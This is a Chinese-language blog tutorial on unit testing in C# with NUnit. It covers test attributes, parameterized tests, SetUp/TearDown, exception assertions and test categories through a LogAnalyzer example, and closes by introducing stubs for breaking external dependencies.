<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzerTests</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_BadExtension_ReturnsFalse</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">        <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"filewithbadextension.foo"</span>);</span><br><span class="line">        Assert.AreEqual(<span class="literal">false</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其中，属性<code>[TestFixture]</code>和<code>[Test]</code>是 NUnit 的特有属性，NUnit 用属性机制来识别和加载测试。这些属性就像一本书里的书签，帮助测试框架识别记载程序集里面的重要部分，以及哪些部分是需要调用的测试。</p>
<blockquote>
<ol>
<li><code>[TestFixture]</code>加载一个类上，标识这个类是一个包含自动化 NUnit 测试的类；</li>
<li><code>[Test]</code>加在一个方法上，标识这个方法是一个需要调用的自动化测试；</li>
</ol>
</blockquote>
<p>&emsp;&emsp;另外，再说一下测试方法名称的规范，一般包含三个部分：<code>[UnitOfWorkName]_[ScenarioUnderTest]_[ExpectedBehavior]</code></p>
<blockquote>
<ol>
<li><code>UnitOfWorkName</code>：被测试的方法、一组方法或者一组类</li>
<li><code>Scenario</code>：测试进行的假设条件，例如“登入失败”，“无效用户”或“密码正确”等</li>
<li><code>ExpectedBehavior</code>：在测试场景指定的条件下，你对被测试方法行为的预期</li>
</ol>
</blockquote>
<h3 id="运行第一个测试"><a href="#运行第一个测试" class="headerlink" title="运行第一个测试"></a>运行第一个测试</h3><p>（1）编写好测试代码之后，点击 “测试” -&gt; “运行” -&gt; “所有测试”<br>（2）然后，点击 “测试” -&gt; “窗口” -&gt; “测试窗口管理器”，你会看到以下场景</p>
<figure class="image-box">
                <img src="381412-20160428003820908-1009770008.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;从上图可以看出，我们得测试方法并没有通过，我们期望（Expected）的结果是 False，而实际（Actual）的结果却是 True。</p>
<h3 id="继续添加测试方法"><a href="#继续添加测试方法" class="headerlink" title="继续添加测试方法"></a>继续添加测试方法</h3><p>（1）通常在进行单元测试时我们会考虑到代码覆盖率，点击 “测试” -&gt; “分析代码覆盖率” -&gt; “所有测试”，你可以看到以下结果：80%</p>
<figure class="image-box">
                <img src="381412-20160428004400830-1366190143.jpg" alt title class>
                <p></p>
            </figure>

<p>（2）这时，我们需要想出完善的测试策略来覆盖所有的情况，因此我们添加一些测试方法来提高我们的代码覆盖率。这里我们添加两个方法，一个测试大写文件扩展名，一个测试小写文件扩展名：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_GoodExtensionLowercase_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"filewithgoodextension.slf"</span>);</span><br><span class="line">    Assert.AreEqual(<span class="literal">true</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_GoodExtensionUppercase_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"filewithgoodextension.SLF"</span>);</span><br><span class="line">    Assert.AreEqual(<span class="literal">true</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时测试结果如下图所示：</p>
<figure class="image-box">
                <img src="381412-20160428004725486-1296481096.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这时再来看看代码覆盖率：<strong>100%</strong></p>
<figure class="image-box">
                <img src="381412-20160428004830064-1790451133.jpg" alt title class>
                <p></p>
            </figure>

<p>（3）为了让所有的测试都能通过，这时我们需要修改源代码，改用大小写不敏感的字符串匹配：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!fileName.EndsWith(<span class="string">".SLF"</span>, StringComparison.CurrentCultureIgnoreCase))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时，我们再来运行一下所有的测试（也可以选择 运行未通过的测试）来看下由红到绿的快感。单元测试的理念很简单：只有所有的测试都通过，继续前行的绿灯才会亮起。哪怕只有一个测试失败了，进度条上都会亮起红灯，显示你的系统（或者测试）出现了问题。</p>
<figure class="image-box">
                <img src="381412-20160428005457064-818833458.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="更多的-NUnit"><a href="#更多的-NUnit" class="headerlink" title="更多的 NUnit"></a>更多的 NUnit</h2><h3 id="参数化重构单元测试"><a href="#参数化重构单元测试" class="headerlink" title="参数化重构单元测试"></a>参数化重构单元测试</h3><p>&emsp;&emsp;NUnit中有个叫做 参数化测试（Parameterized Tests）的功能，我们可以借助<code>[TestCase]</code>标签特性来重构我们的单元测试：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">TestCase(<span class="meta-string">"filewithgoodextension.slf"</span>)</span>]</span><br><span class="line">[<span class="meta">TestCase(<span class="meta-string">"filewithgoodextension.SLF"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_ValidExtensions_ReturnsTrue</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(fileName);</span><br><span class="line">    Assert.AreEqual(<span class="literal">true</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到，借助 TestCase 特性，测试数目没有改变，但是测试代码却变得更易维护，更加易读。</p>
<figure class="image-box">
                <img src="381412-20160428221241595-961890312.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="SetUp-和-TearDown"><a href="#SetUp-和-TearDown" class="headerlink" title="SetUp 和 TearDown"></a>SetUp 和 TearDown</h3><p>&emsp;&emsp;NUnit 还有一些特别的标签特性，可以很方便地控制测试前后的设置和清理状态工作，他们就是<code>[SetUp]</code>和<code>[TearDown]</code>。</p>
<blockquote>
<ol>
<li><code>[SetUp]</code> 这个标签加在一个方法上，NUnit 每次在运行测试类里的任何一个测试时都会先运行这个 setup 方法；</li>
<li><code>[TearDown]</code> 这个标签标识一个方法应该在测试类里的每个测试运行完成之后执行。</li>
</ol>
</blockquote>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">TestFixture</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzerTests</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> LogAnalyzer analyzer = <span class="literal">null</span>;</span><br><span class="line">    [<span class="meta">SetUp</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Setup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_ValidFileLowerCased_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"whatever.slf"</span>);</span><br><span class="line">        Assert.IsTrue(result, <span class="string">"filename should be valid!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Test</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_ValidFileUpperCased_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"whatever.SLF"</span>);</span><br><span class="line">        Assert.IsTrue(result, <span class="string">"filename should be valid!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">TearDown</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TearDown</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        analyzer = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们可以把 setup 和 teardown 方法想象成测试类中测试的构造函数和析构函数，在每个测试类中只能有一个 setup 和 teardown 方法，这两个方法对测试类中的每个方法只执行一次。  </p>
<p>&emsp;&emsp;不过，使用<code>[Setup]</code>越多，测试代码可读性就越差。原书作者推荐采用工厂方法（Factory Method）初始化被测试的实例。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 工厂方法初始化 LogAnalyzer </span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 既节省编写代码的时间，又使每个测试内的代码更简洁易读</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 同时保证 LogAnalyzer 总是用同样的方式初始化</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> LogAnalyzer <span class="title">MakeAnalyzer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在测试方法中可以直接使用：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_BadExtension_ReturnsFalse</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = MakeAnalyzer();</span><br><span class="line">    <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"filewithbadextension.foo"</span>);</span><br><span class="line">    Assert.AreEqual(<span class="literal">false</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="检验预期的异常"><a href="#检验预期的异常" class="headerlink" title="检验预期的异常"></a>检验预期的异常</h3><p>&emsp;&emsp;很多时候，我们的方法中会抛出一些异常，这时如果我们的测试也应该做一些修改。在 NUnit 中，提供了一个 API：<code>Assert.Catch&lt;T&gt;(delegate)</code>。  </p>
<p>&emsp;&emsp;首先，我们修改一下被测试的方法，增加一行判断文件名是否为空的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">string</span>.IsNullOrEmpty(fileName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">"filename has to be provided"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fileName.EndsWith(<span class="string">".SLF"</span>, StringComparison.CurrentCultureIgnoreCase))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，我们新增一个测试方法，使用<code>Assert.Catch</code>来检测异常是否一致：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_EmptyName_Throws</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="comment">// 使用 Assert.Catch</span></span><br><span class="line">    <span class="keyword">var</span> ex = Assert.Catch&lt;Exception&gt;(() =&gt; analyzer.IsValidLogFileName(<span class="keyword">string</span>.Empty));</span><br><span class="line">    <span class="comment">// 使用 Assert.Catch 返回的 Exception 对象</span></span><br><span class="line">    StringAssert.Contains(<span class="string">"filename has to be provided"</span>, ex.Message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="381412-20160428231628877-1355320652.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="忽略测试"><a href="#忽略测试" class="headerlink" title="忽略测试"></a>忽略测试</h3><p>&emsp;&emsp;有时候测试代码有问题，但是我们又需要把代码签入到主代码树中。在这种罕见的情况下（虽然确实非常少），可以给那些测试代码自身有问题的测试加一个<code>[Ignore]</code>标签特性。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line">[<span class="meta">Ignore(<span class="meta-string">"there is a problem with this test!"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_ValidFile_ReturnsTrue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="381412-20160428232214080-254840853.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="设置测试的类别"><a href="#设置测试的类别" class="headerlink" title="设置测试的类别"></a>设置测试的类别</h3><p>&emsp;&emsp;我们可以把测试按照指定的测试类别运行，使用<code>[Category]</code>标签特性就可以实现这个功能：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Test</span>]</span><br><span class="line">[<span class="meta">Category(<span class="meta-string">"Fast Tests"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_BadExtension_ReturnsFalse</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    <span class="keyword">bool</span> result = analyzer.IsValidLogFileName(<span class="string">"filewithbadextension.foo"</span>);</span><br><span class="line">    Assert.AreEqual(<span class="literal">false</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试系统状态的改变"><a href="#测试系统状态的改变" class="headerlink" title="测试系统状态的改变"></a>测试系统状态的改变</h3><p>&emsp;&emsp;此前我们得测试都有返回值，而很多要测试的方法都没有返回值，而只是改变对象中的某些状态，我们又该如何测试呢？  </p>
<p>&emsp;&emsp;首先，我们修改 IsValidLogFileName 方法，增加一个状态属性：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">bool</span> WasLastFileNameValid &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// 改变系统状态</span></span><br><span class="line">        WasLastFileNameValid = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">string</span>.IsNullOrEmpty(fileName))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">"filename has to be provided"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!fileName.EndsWith(<span class="string">".SLF"</span>, StringComparison.CurrentCultureIgnoreCase))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 改变系统状态</span></span><br><span class="line">        WasLastFileNameValid = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其次，我们编写一个测试，对系统状态进行断言：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">TestCase(<span class="meta-string">"badfile.foo"</span>, false)</span>]</span><br><span class="line">[<span class="meta">TestCase(<span class="meta-string">"goodfile.slf"</span>, true)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">IsValidFileName_WhenCalled_ChangesWasLastFileNameValid</span>(<span class="params"><span class="keyword">string</span> fileName, <span class="keyword">bool</span> expected</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LogAnalyzer analyzer = <span class="keyword">new</span> LogAnalyzer();</span><br><span class="line">    analyzer.IsValidLogFileName(fileName);</span><br><span class="line">    Assert.AreEqual(expected, analyzer.WasLastFileNameValid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="381412-20160428233954377-2028928149.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp;这一篇作为入门，带领大家领略了一下单元测试的概念，如何编写单元测试，如何在 VS 中应用 NUnit 进行单元测试。相信大家以前都用过 MSTest，而我们这里却使用了 NUnit。所以，下面我们来总结一下 MSTest 与 NUnit 在特性标签上的一些区别：</p>
<table>
<thead>
<tr>
<th>MS Test Attribute</th>
<th>NUnit Attribute</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td><code>[TestClass]</code></td>
<td><code>[TestFixture]</code></td>
<td>定义一个测试类，里面可以包含很多测试函数和初始化、销毁函数（以下所有标签和其他断言）。</td>
</tr>
<tr>
<td><code>[TestMethod]</code></td>
<td><code>[Test]</code></td>
<td>定义一个独立的测试函数。</td>
</tr>
<tr>
<td><code>[ClassInitialize]</code></td>
<td><code>[TestFixtureSetUp]</code></td>
<td>定义一个测试类初始化函数，每当运行测试类中的一个或多个测试函数时，这个函数将会在测试函数被调用前被调用一次（在第一个测试函数运行前会被调用）。</td>
</tr>
<tr>
<td><code>[ClassCleanup]</code></td>
<td><code>[TestFixtureTearDown]</code></td>
<td>定义一个测试类销毁函数，每当测试类中的选中的测试函数全部运行结束后运行（在最后一个测试函数运行结束后运行）。</td>
</tr>
<tr>
<td><code>[TestInitialize]</code></td>
<td><code>[SetUp]</code></td>
<td>定义测试函数初始化函数，每个测试函数运行前都会被调用一次。</td>
</tr>
<tr>
<td><code>[TestCleanup]</code></td>
<td><code>[TearDown]</code></td>
<td>定义测试函数销毁函数，每个测试函数执行完后都会被调用一次。</td>
</tr>
<tr>
<td><code>[AssemblyInitialize]</code></td>
<td>–</td>
<td>定义测试 Assembly 初始化函数，每当这个 Assembly 中的有测试函数被运行前，会被调用一次（在 Assembly 中第一个测试函数运行前会被调用）。</td>
</tr>
<tr>
<td><code>[AssemblyCleanup]</code></td>
<td>–</td>
<td>定义测试 Assembly 销毁函数，当 Assembly 中所有测试函数运行结束后，运行一次。（在 Assembly 中所有测试函数运行结束后被调用）</td>
</tr>
<tr>
<td><code>[DescriptionAttribute]</code></td>
<td><code>[Category]</code></td>
<td>定义标识分组。</td>
</tr>
</tbody></table>
<p>&emsp;&emsp;目前为止，我们的单元测试都还很简单也还比较顺利。但是，如果我们要测试的方法依赖于一个外部资源，如文件系统、数据库、Web 服务或者其他难以控制的东西，那又该如何编写测试呢？为了解决这些问题，我们需要创建测试<strong>存根</strong>、<strong>伪对象</strong>及<strong>模拟对象</strong>，下一篇核心技术将会介绍这些内容，让我们跟随 Roy Osherove 的《单元测试的艺术》一起去探寻吧。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>（1）Roy Osherove 著，金迎 译，《单元测试的艺术（第2版）》<br>（2）Aileer，《对比 MS Test 与 NUnit Test 框架》</p>
<hr>
<h1 id="核心技术"><a href="#核心技术" class="headerlink" title="核心技术"></a>核心技术</h1><p>&emsp;&emsp;上一篇我们学习基本的单元测试基础知识和入门实例。但是，如果我们要测试的方法依赖于一个外部资源，如文件系统、数据库、Web 服务或者其他难以控制的东西，那又该如何编写测试呢？为了解决这些问题，我们需要创建测试<strong>存根</strong>、<strong>伪对象</strong>及<strong>模拟对象</strong>。这一篇中我们会开始接触这些核心技术，借助存根破除依赖，使用模拟对象进行交互测试，使用隔离框架支持适应未来和可用性的功能。</p>
<h2 id="破除依赖-存根"><a href="#破除依赖-存根" class="headerlink" title="破除依赖-存根"></a>破除依赖-存根</h2><h3 id="为何使用存根？"><a href="#为何使用存根？" class="headerlink" title="为何使用存根？"></a>为何使用存根？</h3><p>&emsp;&emsp;当我们要测试的对象依赖另一个你无法控制（或者还未实现）的对象，这个对象可能是 Web 服务、系统时间、线程调度或者很多其他东西。<br>&emsp;&emsp;那么重要的问题来了：你的测试代码不能控制这个依赖的对象向你的代码返回什么值，也不能控制它的行为（例如你想摸你一个异常）。<br>&emsp;&emsp;因此，这种情况下你可以使用<strong>存根</strong>。</p>
<h3 id="存根简介"><a href="#存根简介" class="headerlink" title="存根简介"></a>存根简介</h3><p>（1）外部依赖项</p>
<blockquote>
<p>&emsp;&emsp;一个外部依赖项是系统中的一个对象，被测试代码与这个对象发生交互，但你不能控制这个对象。（常见的外部依赖项包括：文件系统、线程、内存以及时间等）</p>
</blockquote>
<p>（2）存根</p>
<blockquote>
<p>&emsp;&emsp;一个存根（<strong>Stub</strong>）是对系统中存在的一个依赖项（或者协作者）的可控制的替代物。通过使用存根，你在测试代码时无需直接处理这个依赖项。</p>
</blockquote>
<h3 id="发现项目中的外部依赖"><a href="#发现项目中的外部依赖" class="headerlink" title="发现项目中的外部依赖"></a>发现项目中的外部依赖</h3><p>&emsp;&emsp;继续上一篇中的 LogAn 案例，假设我们的 IsValidLogFilename 方法会首先读取配置文件，如果配置文件说支持这个扩展名，就返回 true：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 读取配置文件</span></span><br><span class="line">    <span class="comment">// 如果配置文件说支持这个扩展名，则返回 true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;那么问题来了：一旦测试依赖于文件系统，我们进行的就是集成测试，会带来所有与集成测试相关的问题—运行速度较慢，需要配置，一次测试多个内容等。</p>
<figure class="image-box">
                <img src="381412-20160429232540878-1553563714.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;换句话说，尽管代码本身的逻辑是完全正确的，但是这种依赖可能导致测试失败。</p>
<h3 id="避免项目中的直接依赖"><a href="#避免项目中的直接依赖" class="headerlink" title="避免项目中的直接依赖"></a>避免项目中的直接依赖</h3><p>想要破除直接依赖，可以参考以下两个步骤：<br>（1）找到被测试对象使用的<strong>外部接口</strong>或者 API；<br>（2）把这个接口的<strong>底层实现</strong>替换成你能控制的东西；  </p>
<p>&emsp;&emsp;对于我们的 LogAn 项目，我们要做到替代实例不会访问文件系统，这样便破除了文件系统的依赖性。因此，我们可以引入一个间接层来避免对文件系统的直接依赖。访问文件系统的代码被隔离在一个 FileExtensionManager 类中，这个类之后将会被一个存根类替代，如下图所示：</p>
<figure class="image-box">
                <img src="381412-20160429234428644-542417512.png" alt title class>
                <p></p>
            </figure>

